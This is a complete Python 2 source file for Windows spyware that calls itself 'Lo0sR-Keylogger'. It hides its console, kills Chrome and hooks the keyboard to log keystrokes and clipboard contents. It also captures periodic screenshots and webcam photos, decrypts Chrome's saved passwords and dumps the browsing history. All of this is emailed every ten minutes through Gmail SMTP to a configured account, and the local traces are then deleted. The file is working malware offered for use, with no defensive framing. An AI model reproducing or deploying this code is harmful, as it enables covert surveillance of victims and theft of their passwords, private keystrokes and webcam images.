import os
import csv
import time
import psutil
import pyHook
import smtplib
import sqlite3
import win32gui
import mimetypes
import pythoncom
import win32crypt
import win32console
import win32clipboard
from os import getenv
from Queue import Queue
from PIL import ImageGrab
from threading import Thread
from VideoCapture import Device
from email.utils import formatdate
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime, timedelta
from email.mime.multipart import MIMEMultipart


NUMBER_OF_THREADS = 6
JOB_NUMBER = [1, 2, 3, 4, 5, 6, ]
queue = Queue()


PROCNAME = "chrome.exe"


# KEYLOGGER CONFIG
# output file name
f_name = "output.txt"


# CAMERA CONFIG

# Screenshot
# interval in sec
interval = 120

# WebCam
cam = Device()
# interval in sec
interval_webcam = 120


# MAIL CONFIG
files = ["output.txt", ]

FromConf = 'your_username@gmail.com'
ToConf = 'your_username@gmail.com'
passwordConf = 'your_password'

intervalMail = 600


def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
hide()


def kill_chrome():
    for proc in psutil.process_iter():
        try:
            if proc.name() == PROCNAME:
                proc.kill()
        except:
            pass
kill_chrome()


def keydown(event):
    global data
    if event.Ascii == 13:
            keys = '  <ENTER>'
            fp = open(f_name, 'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 8:
            keys = '  <BACKSPACE>'
            fp = open(f_name, 'a')
            data = keys
            fp.write(data + '\n')
            fp.close()
    elif event.Ascii == 9:
            keys = '  <TAB>'
            fp = open(f_name, 'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 27:
            keys = '  <ESC>'
            fp = open(f_name, 'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 32:
            keys = '  <SPACE>  '
            fp = open(f_name, 'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 0:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        fp = open(f_name, 'a')
        fp.write(data + "\n")
        fp.close()
    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
            pass
    else:
            keys = chr(event.Ascii)
            fp = open(f_name, 'a')
            data = keys
            fp.write(data)
            fp.close()

def keylogger():
    obj = pyHook.HookManager()
    obj.KeyDown = keydown
    obj.HookKeyboard()
    obj.HookMouse()
    pythoncom.PumpMessages()


def webcam_pic(interval_w):

    while True:
        time.sleep(interval_w)
        cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
        scr = "webcam_" + cur_time + ".jpg"
        files.append(str(scr))
        cam.saveSnapshot(scr)


def screenshot(interval_scr):
    while True:
        time.sleep(interval_scr)
        cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
        scr = "screenshot_" + cur_time + ".png"
        files.append(str(scr))
        ImageGrab.grab().save(scr, "PNG")


def send_mail(From, To, password, intervalM):

    while True:

        time.sleep(intervalM)
        msg = MIMEMultipart()
        msg['From'] = From
        msg['To'] = To
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = 'Lo0sR-Keylogger'

        msg.attach(MIMEText('Output'))

        try:
            smtp = smtplib.SMTP('smtp.gmail.com:587')
            smtp.starttls()
            smtp.login(From, password)
        except:
            login = 'failed'
            print login
        else:
            login = 'success'
            print login

        if login == 'success':
            for f in files:
                ctype, encoding = mimetypes.guess_type(f)
                if ctype is None or encoding is not None:
                    # No guess could be made, or the file is encoded (compressed), so
                    # use a generic bag-of-bits type.
                    ctype = 'application/octet-stream'
                maintype, subtype = ctype.split('/', 1)
                if maintype == 'text':
                    fp = open(f)
                    # Note: we should handle calculating the charset
                    part = MIMEText(fp.read(), _subtype=subtype)
                    fp.close()
                elif maintype == 'image':
                    fp = open(f, 'rb')
                    part = MIMEImage(fp.read(), _subtype=subtype)
                    fp.close()
                else:
                    fp = open(f, 'rb')
                    part = MIMEBase(maintype, subtype)
                    part.set_payload(fp.read())
                    fp.close()
                part.add_header('Content-Disposition', 'attachment; filename="%s"' % f)
                msg.attach(part)
            try:
                smtp.sendmail(From, To, msg.as_string())
                open(f_name, 'w').close()
                with open(f_name, 'w') as fl:
                    fl.write('### Keylogger - Log ###\n')
                    fl.close()
                dump_chrome_passwords()
                for fi in files[1:]:
                    os.remove(fi)
                del files[:]
                files.append("output.txt")
                smtp.close()
            except:
                print 'fail'
                smtp.close()
        else:
            smtp.close()
            print 'fail'


"""
Dump All Chrome Passwords
Output:

    Website: some-website.com
    Username: some username for this website
    Password: password for this Username

"""


def dump_chrome_passwords():

    conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
    cursor = conn.cursor()

    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    with open(f_name, 'a') as f:
        f.write('\n\n\n### All Chrome Passwords ###\n\n\n')
        f.close()
    for result in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password:
            site = 'Site: ' + result[0]
            username = 'Username: ' + result[1]
            password = 'Password: ' + password
            with open(f_name, 'a') as f:
                f.write(site + '\n' + username + '\n' + password + '\n\n')
                f.close()
    with open(f_name, 'a') as f:
        f.write('\n\n### END ###\n\n\n')
        f.close()


def dump_chrome_history():
    connection = sqlite3.connect(os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\history")
    connection.text_factory = str
    cur = connection.cursor()
    output_file = open('chrome_history.csv', 'wb')
    csv_writer = csv.writer(output_file)
    headers = ('URL', 'Title', 'Visit Count', 'Date (GMT)')
    csv_writer.writerow(headers)
    epoch = datetime(1601, 1, 1)
    for row in (cur.execute('select url, title, visit_count, last_visit_time from urls')):
        row = list(row)
        url_time = epoch + timedelta(microseconds=row[3])
        row[3] = url_time
        csv_writer.writerow(row)
    files.append("chrome_history.csv")


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = Thread(target=work)
        t.daemon = True
        t.start()


def work():

    x = queue.get()
    if x == 1:
        keylogger()
    if x == 2:
        send_mail(FromConf, ToConf, passwordConf, intervalMail)
    if x == 3:
        screenshot(interval)
    if x == 4:
        dump_chrome_passwords()
    if x == 5:
        webcam_pic(interval_webcam)
    if x == 6:
        dump_chrome_history()

    queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
